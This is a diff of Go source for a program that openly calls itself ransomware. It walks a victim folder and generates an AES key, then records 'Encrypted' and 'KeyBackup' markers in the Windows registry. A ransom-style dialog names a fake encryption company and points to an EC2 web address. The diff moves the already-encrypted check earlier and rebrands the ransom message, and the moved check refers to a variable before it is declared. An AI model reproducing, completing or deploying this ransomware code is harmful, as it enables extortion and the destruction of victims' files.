@@ -8,11 +8,12 @@ import (
 	"os"
 	"path/filepath"
 	"time"
+
 	"golang.org/x/sys/windows/registry"
 	"tawesoft.co.uk/go/dialog"
 )
 
-var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@1234567890#$%&*()=-[]{}|?/.;")
+var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@1234567890#$%&*()=-[]{}|?/.;+")
 
 func randSeq(n int) string {
 	b := make([]rune, n)
@@ -23,13 +24,21 @@ func randSeq(n int) string {
 }
 
 func main() {
+	k, err := registry.OpenKey(registry.CURRENT_USER, `Environment`, registry.QUERY_VALUE|registry.SET_VALUE)
+	check, keyType, err := k.GetStringValue("Encrypted")
+
+	if check == "1" {
+		dialog.Alert("Thank you for choosing Smith & Johnson Encryption Services as your source of ransomware!\n\nPlease contact us using our website " + url + ".")
+		os.Exit(1)
+	}
 	rand.Seed(time.Now().UnixNano())
 
 	aesKey := randSeq(32)
-
+	url := "http://ec2-3-208-127-56.compute-1.amazonaws.com"
 	victimDirectory := "C:\\ftp\\"
+
 	var files []string
-	err := filepath.Walk(victimDirectory,
+	err = filepath.Walk(victimDirectory,
 		func(path string, info os.FileInfo, err error) error {
 			if err != nil {
 				return err
@@ -45,13 +54,6 @@ func main() {
 	}
 	key := []byte(aesKey)
 
-	k, err := registry.OpenKey(registry.CURRENT_USER, `Environment`, registry.QUERY_VALUE|registry.SET_VALUE)
-	check, keyType, err := k.GetStringValue("Encrypted")
-
-	if check == "1" {
-		dialog.Alert("Thank you for choosing The Red Team as your source of ransomware!\n\nPlease contact us using our website <url>.")
-		os.Exit(1)
-	}
 	k.SetStringValue("Encrypted", "1")
 	k.SetStringValue("KeyBackup", aesKey)
 
@@ -78,5 +80,5 @@ func main() {
 			println("f", err)
 		}
 	}
-	dialog.Alert("Thank you for choosing The Red Team as your source of ransomware!\n\nPlease contact us using our website <url>.")
+	dialog.Alert("Thank you for choosing Smith & Johnson Encryption Services as your source of ransomware!\n\nPlease contact us using our website " + url + ".")
 }
